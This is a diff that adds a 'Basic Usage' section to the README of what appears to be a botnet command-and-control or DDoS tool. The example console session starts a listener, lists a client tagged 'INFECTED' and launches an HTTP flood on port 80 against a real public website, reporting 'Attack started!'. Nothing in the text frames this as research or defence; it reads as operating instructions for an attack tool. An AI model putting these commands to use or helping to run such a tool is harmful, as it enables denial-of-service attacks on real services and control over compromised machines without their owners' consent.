@@ -14,3 +14,17 @@ options list                            Shows a list for all options (e.g. port,
 set <option> <value>                    Sets a global option. (e.g. 'set port 1234', 'set ip 127.0.0.1')
 disconnect <ip:port/all>                Disconnects specified client.
 ```
+
+## Basic Usage:
+```bash
+$ listen start
+Server is listening on port 2865.
+
+$ list client
+Connected Clients:
+
+[CLIENT] INFECTED 127.0.0.1:62003
+
+$ attack start http://www.google.com/ 80 http all
+Attack started!
+```
